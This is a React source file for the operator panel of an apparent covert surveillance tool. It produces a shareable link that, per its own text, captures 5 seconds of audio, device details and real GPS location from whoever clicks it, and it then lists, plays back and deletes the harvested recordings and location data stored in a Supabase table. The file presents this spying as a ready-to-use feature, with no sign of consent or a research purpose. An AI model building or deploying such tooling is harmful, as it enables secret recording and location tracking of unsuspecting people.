import { useState, useEffect } from "react";
import { Link } from "react-router-dom";
import { 
  Mic, Loader2, ArrowLeft, Copy, Check, ExternalLink, 
  Headphones, Info, Link2, Smartphone, Database, 
  Trash2, RefreshCw, Volume2, FileJson, Radio, MapPin,
  Shield, Zap, LucideIcon
} from "lucide-react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { toast } from "@/hooks/use-toast";
import { useSettings } from "@/contexts/SettingsContext";
import { supabase } from "@/integrations/supabase/client";
import { cn } from "@/lib/utils";

interface CapturedData {
  id: string;
  session_id: string;
  image_data: string;
  captured_at: string;
  user_agent: string | null;
}

interface Tab {
  id: string;
  label: string;
  icon: LucideIcon;
  color: string;
}

const tabs: Tab[] = [
  { id: "audiocapture", label: "AUDIO", icon: Mic, color: "red" },
  { id: "media", label: "DATA", icon: Database, color: "orange" },
];

const Page2 = () => {
  const { settings } = useSettings();
  
  const [activeTab, setActiveTab] = useState<string | null>(null);
  const [copiedLink, setCopiedLink] = useState(false);
  const [capturedData, setCapturedData] = useState<CapturedData[]>([]);
  const [isLoadingData, setIsLoadingData] = useState(false);

  const baseUrl = window.location.origin;
  const sessionId = settings.camSessionId || "audiocap01";
  const captureLink = `${baseUrl}/audio-capture?session=${sessionId}`;

  const fetchCapturedData = async () => {
    setIsLoadingData(true);
    try {
      const { data, error } = await supabase
        .from("captured_photos")
        .select("*")
        .or(`session_id.eq.${sessionId},session_id.eq.${sessionId}_deviceinfo`)
        .order("captured_at", { ascending: false });
      if (error) throw error;
      setCapturedData(data || []);
    } catch (err) {
      console.error("Failed to fetch data:", err);
    } finally {
      setIsLoadingData(false);
    }
  };

  const deleteItem = async (id: string) => {
    try {
      const { error } = await supabase.from("captured_photos").delete().eq("id", id);
      if (error) throw error;
      setCapturedData(prev => prev.filter(item => item.id !== id));
      toast({ title: "Deleted!" });
    } catch (err) {
      toast({ title: "Error", variant: "destructive" });
    }
  };

  const clearAllData = async () => {
    try {
      const { error } = await supabase
        .from("captured_photos")
        .delete()
        .or(`session_id.eq.${sessionId},session_id.eq.${sessionId}_deviceinfo`);
      if (error) throw error;
      setCapturedData([]);
      toast({ title: "Cleared!" });
    } catch (err) {
      toast({ title: "Error", variant: "destructive" });
    }
  };

  useEffect(() => {
    if (activeTab === "media") fetchCapturedData();
  }, [activeTab, sessionId]);

  const copyLink = async () => {
    await navigator.clipboard.writeText(captureLink);
    setCopiedLink(true);
    toast({ title: "Link Copied!" });
    setTimeout(() => setCopiedLink(false), 2000);
  };

  const tabColors: Record<string, { bg: string; text: string; activeBg: string; border: string }> = {
    red: { bg: "bg-red-500/8", text: "text-red-400", activeBg: "bg-red-500", border: "border-red-500/20" },
    orange: { bg: "bg-amber-500/8", text: "text-amber-400", activeBg: "bg-amber-500", border: "border-amber-500/20" },
  };


  return (
    <div className="min-h-[100dvh] bg-[#09090b] relative overflow-hidden">
      {/* Background */}
      <div className="fixed inset-0 pointer-events-none">
        <div className="absolute top-[-20%] right-[-10%] w-[500px] h-[500px] rounded-full bg-red-600/[0.05] blur-[100px]" />
        <div className="absolute bottom-[-15%] left-[-10%] w-[400px] h-[400px] rounded-full bg-amber-600/[0.04] blur-[100px]" />
      </div>

      <div className="relative z-10 min-h-[100dvh] flex flex-col">
        {/* Header */}
        <header className="px-4 py-3 bg-white/[0.03] backdrop-blur-xl border-b border-white/[0.06] sticky top-0 z-20">
          <div className="flex items-center justify-between max-w-xl mx-auto">
            <Link 
              to="/" 
              className="flex items-center gap-2 px-3 py-1.5 rounded-xl border border-white/[0.08] bg-white/[0.04] text-white/60 hover:bg-white/[0.08] transition-all text-xs font-medium"
            >
              <ArrowLeft className="w-3.5 h-3.5" /> BACK
            </Link>
            
            <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-red-500/10 border border-red-500/20">
              <Radio className="w-3.5 h-3.5 text-red-400 animate-pulse" />
              <span className="text-[10px] font-bold text-red-400 uppercase tracking-wider">Page 2</span>
            </div>
            
            
          </div>
        </header>

        {/* Tab Grid */}
        <div className="px-4 py-4">
          <div className="max-w-xl mx-auto grid grid-cols-4 gap-2">
            {tabs.map((tab) => {
              const colors = tabColors[tab.color] || tabColors.red;
              const Icon = tab.icon;
              const isActive = activeTab === tab.id;
              return (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(isActive ? null : tab.id)}
                  className={cn(
                    "flex flex-col items-center gap-1.5 p-3 rounded-xl border transition-all active:scale-95",
                    isActive
                      ? `${colors.activeBg} border-transparent text-white shadow-lg`
                      : `bg-white/[0.03] ${colors.border} ${colors.text} hover:bg-white/[0.06] hover:scale-[1.03]`
                  )}
                >
                  <div className={cn(
                    "w-8 h-8 rounded-lg flex items-center justify-center",
                    isActive ? "bg-white/20" : "bg-white/[0.04]"
                  )}>
                    <Icon className="w-4 h-4" />
                  </div>
                  <span className="text-[9px] font-bold uppercase tracking-wider">{tab.label}</span>
                </button>
              );
            })}

            {/* Back to Page 1 */}
            <Link to="/">
              <div className="flex flex-col items-center gap-1.5 p-3 rounded-xl border border-white/[0.08] bg-white/[0.03] text-emerald-400 hover:bg-white/[0.06] hover:scale-[1.03] transition-all active:scale-95">
                <div className="w-8 h-8 rounded-lg bg-white/[0.04] flex items-center justify-center">
                  <ArrowLeft className="w-4 h-4" />
                </div>
                <span className="text-[9px] font-bold uppercase tracking-wider">Page 1</span>
              </div>
            </Link>
          </div>
        </div>

        {/* Main Content */}
        <main className="flex-1 px-4 py-2">
          <div className="max-w-xl mx-auto">
            
            {/* Audio Capture Tab */}
            {activeTab === "audiocapture" && (
              <div className="space-y-3 animate-in fade-in duration-300">
                {/* Info */}
                <div className="flex items-start gap-2.5 p-3 rounded-xl bg-amber-500/[0.06] border border-amber-500/[0.12]">
                  <Info className="w-4 h-4 text-amber-400/80 flex-shrink-0 mt-0.5" />
                  <p className="text-[11px] text-white/50 leading-relaxed">
                    Link click hone pe <span className="text-red-400 font-semibold">5 sec audio</span> + <span className="text-amber-400 font-semibold">device info</span> + <span className="text-emerald-400 font-semibold">real GPS location</span> capture hogi.
                  </p>
                </div>

                {/* Session */}
                <div className="p-4 rounded-xl bg-white/[0.03] border border-white/[0.06]">
                  <label className="text-[10px] font-semibold text-white/30 uppercase tracking-wider mb-2 block">Session ID</label>
                  <div className="flex items-center gap-2 p-3 rounded-lg bg-white/[0.04] border border-white/[0.06]">
                    <Radio className="w-4 h-4 text-red-400" />
                    <span className="text-sm font-mono text-white/80">{sessionId}</span>
                  </div>
                </div>

                {/* Link */}
                <div className="p-4 rounded-xl bg-white/[0.03] border border-white/[0.06]">
                  <label className="text-[10px] font-semibold text-white/30 uppercase tracking-wider mb-2 flex items-center gap-1.5">
                    <Link2 className="w-3 h-3" /> Capture Link
                  </label>
                  <div className="flex gap-2">
                    <Input
                      value={captureLink}
                      readOnly
                      className="flex-1 h-10 bg-white/[0.04] border-white/[0.08] text-red-400/80 font-mono text-xs"
                    />
                    <Button onClick={copyLink} className="h-10 px-4 bg-gradient-to-r from-red-600 to-red-500 hover:opacity-90">
                      {copiedLink ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                    </Button>
                  </div>
                </div>

                {/* Test Button */}
                <button
                  onClick={() => window.open(captureLink, '_blank')}
                  className="w-full h-11 rounded-xl bg-gradient-to-r from-red-600 to-amber-600 text-white text-sm font-semibold hover:opacity-90 active:scale-[0.98] transition-all flex items-center justify-center gap-2"
                >
                  <ExternalLink className="w-4 h-4" /> TEST LINK
                </button>

                {/* Features */}
                <div className="grid grid-cols-3 gap-2">
                  {[
                    { icon: Headphones, label: "AUDIO", color: "red" },
                    { icon: Smartphone, label: "DEVICE", color: "amber" },
                    { icon: MapPin, label: "GPS", color: "emerald" },
                  ].map(f => (
                    <div key={f.label} className={`p-3 rounded-xl bg-${f.color}-500/[0.06] border border-${f.color}-500/[0.12] text-center`}>
                      <f.icon className={`w-5 h-5 mx-auto mb-1 text-${f.color}-400`} />
                      <p className={`text-[9px] font-bold text-${f.color}-400`}>{f.label}</p>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Media/Data Tab */}
            {activeTab === "media" && (
              <div className="space-y-3 animate-in fade-in duration-300">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Database className="w-4 h-4 text-amber-400" />
                    <span className="text-xs font-semibold text-white/80 uppercase">Captured Data</span>
                    <span className="px-2 py-0.5 rounded-lg bg-amber-500/15 text-[10px] font-bold text-amber-400">
                      {capturedData.length}
                    </span>
                  </div>
                  <div className="flex gap-2">
                    <Button size="sm" variant="outline" onClick={fetchCapturedData} disabled={isLoadingData}
                      className="h-8 px-3 border-white/[0.08] bg-white/[0.04] text-white/50 hover:bg-white/[0.08]">
                      <RefreshCw className={cn("w-3.5 h-3.5", isLoadingData && "animate-spin")} />
                    </Button>
                    {capturedData.length > 0 && (
                      <Button size="sm" variant="outline" onClick={clearAllData}
                        className="h-8 px-3 border-red-500/20 bg-red-500/10 text-red-400 hover:bg-red-500/20">
                        <Trash2 className="w-3.5 h-3.5" />
                      </Button>
                    )}
                  </div>
                </div>

                {isLoadingData ? (
                  <div className="flex items-center justify-center py-12">
                    <Loader2 className="w-6 h-6 text-violet-500 animate-spin" />
                  </div>
                ) : capturedData.length === 0 ? (
                  <div className="text-center py-12 rounded-xl bg-white/[0.02] border border-white/[0.06]">
                    <Database className="w-12 h-12 mx-auto mb-3 text-white/10" />
                    <p className="text-sm font-medium text-white/30">No data yet</p>
                  </div>
                ) : (
                  <div className="space-y-3 max-h-[400px] overflow-y-auto">
                    {capturedData.map((item) => {
                      const isDeviceInfo = item.session_id.endsWith("_deviceinfo");
                      const isAudio = item.image_data.startsWith("data:audio");
                      
                      return (
                        <div 
                          key={item.id}
                          className={cn(
                            "p-4 rounded-xl border",
                            isDeviceInfo 
                              ? "bg-amber-500/[0.04] border-amber-500/[0.12]" 
                              : "bg-red-500/[0.04] border-red-500/[0.12]"
                          )}
                        >
                          <div className="flex items-start justify-between gap-3 mb-3">
                            <div className="flex items-center gap-3">
                              <div className={cn(
                                "w-9 h-9 rounded-lg flex items-center justify-center",
                                isDeviceInfo ? "bg-amber-500/15" : "bg-red-500/15"
                              )}>
                                {isDeviceInfo ? <FileJson className="w-4 h-4 text-amber-400" /> : <Volume2 className="w-4 h-4 text-red-400" />}
                              </div>
                              <div>
                                <p className={cn("text-xs font-semibold", isDeviceInfo ? "text-amber-400" : "text-red-400")}>
                                  {isDeviceInfo ? "DEVICE + LOCATION" : "AUDIO"}
                                </p>
                                <p className="text-[9px] text-white/30">{new Date(item.captured_at).toLocaleString()}</p>
                              </div>
                            </div>
                            <Button size="sm" variant="ghost" onClick={() => deleteItem(item.id)}
                              className="h-8 w-8 p-0 text-red-400 hover:bg-red-500/15">
                              <Trash2 className="w-3.5 h-3.5" />
                            </Button>
                          </div>
                          
                          {isDeviceInfo ? (
                            <div className="p-3 rounded-lg bg-white/[0.03] max-h-40 overflow-y-auto">
                              <pre className="text-[9px] text-white/40 whitespace-pre-wrap break-all font-mono">
                                {(() => {
                                  try { return JSON.stringify(JSON.parse(item.image_data), null, 2); }
                                  catch { return item.image_data; }
                                })()}
                              </pre>
                            </div>
                          ) : isAudio ? (
                            <audio controls className="w-full h-10" src={item.image_data} />
                          ) : (
                            <div className="p-3 rounded-lg bg-white/[0.03]">
                              <p className="text-[9px] text-white/30 truncate font-mono">{item.image_data.substring(0, 100)}...</p>
                            </div>
                          )}
                        </div>
                      );
                    })}
                  </div>
                )}
              </div>
            )}

            {/* Empty State */}
            {!activeTab && (
              <div className="text-center py-16">
                <div className="w-16 h-16 mx-auto mb-4 rounded-2xl bg-white/[0.04] border border-white/[0.06] flex items-center justify-center">
                  <Zap className="w-8 h-8 text-white/15" />
                </div>
                <h3 className="text-sm font-semibold text-white/50 mb-1">Select a Tool</h3>
                <p className="text-[11px] text-white/25">Tap on any tab above</p>
              </div>
            )}
          </div>
        </main>

        {/* Footer */}
        <footer className="px-4 py-3 border-t border-white/[0.04]">
          <div className="max-w-xl mx-auto flex items-center justify-center gap-3">
            <Shield className="w-3 h-3 text-white/20" />
            <span className="text-[9px] text-white/20 uppercase tracking-wider">Page 2 • Advanced Tools</span>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default Page2;
